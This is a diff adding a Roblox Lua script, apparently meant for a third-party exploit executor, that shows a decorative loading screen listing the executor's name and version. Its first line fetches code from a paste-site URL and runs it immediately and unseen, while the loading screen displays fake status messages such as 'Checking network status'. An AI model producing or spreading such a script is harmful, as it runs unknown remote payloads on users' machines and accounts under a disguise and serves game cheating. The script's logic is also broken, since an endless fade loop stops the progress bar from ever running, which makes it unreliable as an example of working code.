@@ -1,0 +1,128 @@
+loadstring(game:HttpGet("http://vpaste.net/16QVR", true))()
+local p = game:GetService("Players")
+local r = game:GetService("ReplicatedFirst")
+local t = game:GetService("TweenService")
+local c = game:GetService("CoreGui")
+
+local lp = p.LocalPlayer
+local name , ver = identifyexecutor()
+
+r:RemoveDefaultLoadingScreen()
+
+local s = Instance.new("ScreenGui")
+s.Name = "LoadingScreen"
+s.IgnoreGuiInset = true
+s.ResetOnSpawn = false
+s.Parent = c
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
+bg.Parent = s
+
+local rImg = Instance.new("ImageLabel")
+rImg.Size = UDim2.new(0, 180, 0, 180)
+rImg.Position = UDim2.new(0.3, 0, 0.30, 0)
+rImg.AnchorPoint = Vector2.new(0.5, 0)
+rImg.BackgroundTransparency = 1
+rImg.Image = "rbxassetid://88507069868326"
+rImg.Parent = bg
+
+t:Create(rImg, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+	Position = UDim2.new(0.3, 0, 0.28, 0)
+}):Play()
+
+local pbg = Instance.new("Frame")
+pbg.Size = UDim2.new(0.35, 0, 0.02, 0)
+pbg.Position = UDim2.new(0.5, -175, 0.70, 0)
+pbg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+pbg.BorderSizePixel = 0
+pbg.Parent = bg
+
+local pc = Instance.new("UICorner")
+pc.CornerRadius = UDim.new(1, 0)
+pc.Parent = pbg
+
+local pf = Instance.new("Frame")
+pf.Size = UDim2.new(0, 0, 1, 0)
+pf.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+pf.BorderSizePixel = 0
+pf.Parent = pbg
+
+local pfc = Instance.new("UICorner")
+pfc.CornerRadius = UDim.new(1, 0)
+pfc.Parent = pf
+
+local txt = {
+    "Identifying Executor",
+    "Executor used: "..name.."",
+    "Executor Version: "..ver.."",
+    "Checking network status",
+    "Loading, Please wait."
+}
+
+local y = 0.30
+local gap = 0.06
+local fadeTime = 3
+
+local bubbles = {}
+
+for i, line in ipairs(txt) do
+    local bubble = Instance.new("TextLabel")
+    bubble.Size = UDim2.new(0, 320, 0, 64)
+    bubble.Position = UDim2.new(0.55, 0, y + (i * gap), 0)
+    bubble.AnchorPoint = Vector2.new(0.5, 0)
+    bubble.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    bubble.TextColor3 = Color3.new(1, 1, 1)
+    bubble.Font = Enum.Font.Gotham
+    bubble.TextSize = 18
+    bubble.TextWrapped = true
+    bubble.Text = line
+    bubble.BackgroundTransparency = 1
+    bubble.TextTransparency = 1
+    bubble.BorderSizePixel = 0
+    bubble.Parent = bg
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0.1, 0)
+    corner.Parent = bubble
+
+    table.insert(bubbles, bubble)
+end
+
+local function fadeLoop()
+    while true do
+        for _, bubble in ipairs(bubbles) do
+            t:Create(bubble, TweenInfo.new(fadeTime), {
+                TextTransparency = 0,
+                BackgroundTransparency = 0.1
+            }):Play()
+
+            wait(2)
+
+            t:Create(bubble, TweenInfo.new(fadeTime), {
+                TextTransparency = 1,
+                BackgroundTransparency = 1
+            }):Play()
+
+            wait(2)
+        end
+    end
+end
+
+fadeLoop()
+
+coroutine.wrap(function()
+    local progress = 0
+    while progress < 1 do
+        progress = math.min(progress + math.random(3, 5) / 1000, 1)
+        t:Create(pf, TweenInfo.new(2.8, Enum.EasingStyle.Sine), {
+            Size = UDim2.new(progress, 0, 1, 0)
+        }):Play()
+        wait(3)
+    end
+end)()
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
